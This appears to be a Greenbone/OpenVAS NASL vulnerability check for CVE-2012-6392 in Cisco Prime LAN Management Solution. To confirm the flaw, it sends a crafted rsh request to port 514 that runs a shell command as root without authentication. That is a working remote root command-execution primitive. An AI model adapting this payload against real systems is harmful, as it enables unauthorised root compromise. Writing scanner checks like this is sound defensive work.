if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901215" );
	script_version( "2021-08-05T12:20:54+0000" );
	script_bugtraq_id( 57221 );
	script_tag( name: "last_modification", value: "2021-08-05 12:20:54 +0000 (Thu, 05 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-01-24 16:05:48 +0530 (Thu, 24 Jan 2013)" );
	script_cve_id( "CVE-2012-6392" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Cisco Prime LAN Management Solution Remote Command Execution Vulnerability" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "CISCO" );
	script_dependencies( "rsh.sc", "os_detection.sc" );
	script_require_ports( "Services/rsh", 514 );
	script_mandatory_keys( "Host/runs_unixoide" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/81110" );
	script_xref( name: "URL", value: "http://telussecuritylabs.com/threats/show/TSL20130118-01" );
	script_xref( name: "URL", value: "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130109-lms" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to execute arbitrary command
  in the context of the root user." );
	script_tag( name: "affected", value: "Cisco Prime LMS Virtual Appliance Version 4.1 through 4.2.2 on Linux." );
	script_tag( name: "insight", value: "Flaw is due to improper validation of authentication and authorization
  commands sent to certain TCP ports." );
	script_tag( name: "solution", value: "Upgrade to Cisco Prime LMS Virtual Appliance to 4.2.3 or later." );
	script_tag( name: "summary", value: "The host is installed with Cisco Prime LAN Management Solution and
  is prone to remote command execution vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 514, proto: "rsh" );
soc = open_priv_sock_tcp( dport: port );
if(!soc){
	exit( 0 );
}
crafted_data = NASLString( "0\0", "root", "\0", "root", "\0", "cat /opt/CSCOpx/setup/lms.info\0" );
send( socket: soc, data: crafted_data );
res = recv( socket: soc, length: 2048 );
close( soc );
if(res && ContainsString( res, "LAN Management Solution" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

